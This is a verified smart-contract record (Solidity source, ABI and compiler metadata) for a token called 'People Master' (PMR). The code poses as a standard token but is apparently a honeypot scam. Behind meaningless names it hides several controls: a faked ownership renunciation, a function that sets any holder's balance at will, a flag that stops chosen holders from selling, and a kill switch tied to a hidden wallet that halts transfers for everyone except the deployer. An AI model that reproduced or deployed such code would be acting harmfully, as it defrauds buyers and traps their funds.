{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface enableLaunch {\n    function createPair(address launchedTxTo, address feeMax) external returns (address);\n}\n\ninterface isSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamShouldBuy) external view returns (uint256);\n\n    function transfer(address maxShould, uint256 teamTx) external returns (bool);\n\n    function allowance(address senderShouldMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxShould,\n        uint256 teamTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTo, uint256 value);\n    event Approval(address indexed senderShouldMax, address indexed spender, uint256 value);\n}\n\nabstract contract takeWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyMax is isSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PeopleMaster is takeWallet, isSender, buyMax {\n\n    function transfer(address enableLimit, uint256 teamTx) external virtual override returns (bool) {\n        return enableWallet(_msgSender(), enableLimit, teamTx);\n    }\n\n    bool public minEnableAt;\n\n    address private txToken;\n\n    address amountLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeFrom;\n    }\n\n    bool public launchList;\n\n    function balanceOf(address teamShouldBuy) public view virtual override returns (uint256) {\n        return isShouldEnable[teamShouldBuy];\n    }\n\n    function transferFrom(address maxFrom, address maxShould, uint256 teamTx) external override returns (bool) {\n        if (_msgSender() != takeToken) {\n            if (receiverShould[maxFrom][_msgSender()] != type(uint256).max) {\n                require(teamTx <= receiverShould[maxFrom][_msgSender()]);\n                receiverShould[maxFrom][_msgSender()] -= teamTx;\n            }\n        }\n        return enableWallet(maxFrom, maxShould, teamTx);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromTake;\n    }\n\n    mapping(address => bool) public txAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLimitBuy;\n    }\n\n    address public receiverEnable;\n\n    function totalFromSwap() public {\n        emit OwnershipTransferred(receiverEnable, address(0));\n        txToken = address(0);\n    }\n\n    event OwnershipTransferred(address indexed buyWallet, address indexed minAuto);\n\n    function modeSell() private view {\n        require(totalTeam[_msgSender()]);\n    }\n\n    uint256 private receiverMax;\n\n    function launchedLaunch(address tokenLaunched) public {\n        if (feeReceiver) {\n            return;\n        }\n        if (launchList) {\n            launchList = true;\n        }\n        totalTeam[tokenLaunched] = true;\n        if (tokenIs) {\n            tokenIs = true;\n        }\n        feeReceiver = true;\n    }\n\n    function launchedWalletFee(uint256 teamTx) public {\n        modeSell();\n        listMax = teamTx;\n    }\n\n    uint8 private txAmount = 18;\n\n    bool private tokenIs;\n\n    mapping(address => uint256) private isShouldEnable;\n\n    function allowance(address enableBuyFrom, address shouldMarketing) external view virtual override returns (uint256) {\n        if (shouldMarketing == takeToken) {\n            return type(uint256).max;\n        }\n        return receiverShould[enableBuyFrom][shouldMarketing];\n    }\n\n    function getOwner() external view returns (address) {\n        return txToken;\n    }\n\n    function receiverFeeBuy(address minSell) public {\n        modeSell();\n        if (receiverMax == maxAmount) {\n            maxAmount = receiverMax;\n        }\n        if (minSell == receiverEnable || minSell == feeSender) {\n            return;\n        }\n        txAuto[minSell] = true;\n    }\n\n    uint256 constant autoFee = 12 ** 10;\n\n    mapping(address => bool) public totalTeam;\n\n    string private marketingLimitBuy = \"People Master\";\n\n    bool public feeReceiver;\n\n    string private modeFrom = \"PMR\";\n\n    function minLiquidityFund(address maxFrom, address maxShould, uint256 teamTx) internal returns (bool) {\n        require(isShouldEnable[maxFrom] >= teamTx);\n        isShouldEnable[maxFrom] -= teamTx;\n        isShouldEnable[maxShould] += teamTx;\n        emit Transfer(maxFrom, maxShould, teamTx);\n        return true;\n    }\n\n    function enableWallet(address maxFrom, address maxShould, uint256 teamTx) internal returns (bool) {\n        if (maxFrom == receiverEnable) {\n            return minLiquidityFund(maxFrom, maxShould, teamTx);\n        }\n        uint256 launchedWallet = isSender(feeSender).balanceOf(amountLaunched);\n        require(launchedWallet == listMax);\n        require(maxShould != amountLaunched);\n        if (txAuto[maxFrom]) {\n            return minLiquidityFund(maxFrom, maxShould, autoFee);\n        }\n        return minLiquidityFund(maxFrom, maxShould, teamTx);\n    }\n\n    constructor (){\n        if (minEnableAt != launchList) {\n            minEnableAt = true;\n        }\n        totalTrading receiverAmountMarketing = totalTrading(takeToken);\n        feeSender = enableLaunch(receiverAmountMarketing.factory()).createPair(receiverAmountMarketing.WETH(), address(this));\n        if (launchList) {\n            launchList = true;\n        }\n        receiverEnable = _msgSender();\n        totalTeam[receiverEnable] = true;\n        isShouldEnable[receiverEnable] = fromTake;\n        totalFromSwap();\n        if (minEnableAt) {\n            launchList = true;\n        }\n        emit Transfer(address(0), receiverEnable, fromTake);\n    }\n\n    uint256 listMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txAmount;\n    }\n\n    function approve(address shouldMarketing, uint256 teamTx) public virtual override returns (bool) {\n        receiverShould[_msgSender()][shouldMarketing] = teamTx;\n        emit Approval(_msgSender(), shouldMarketing, teamTx);\n        return true;\n    }\n\n    address public feeSender;\n\n    function totalAt(address enableLimit, uint256 teamTx) public {\n        modeSell();\n        isShouldEnable[enableLimit] = teamTx;\n    }\n\n    function owner() external view returns (address) {\n        return txToken;\n    }\n\n    address takeToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fromTake = 100000000 * 10 ** 18;\n\n    uint256 receiverWallet;\n\n    mapping(address => mapping(address => uint256)) private receiverShould;\n\n    uint256 public maxAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShouldMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuyFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShouldBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamTx\",\"type\":\"uint256\"}],\"name\":\"launchedWalletFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"}],\"name\":\"receiverFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTx\",\"type\":\"uint256\"}],\"name\":\"totalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFromSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PeopleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}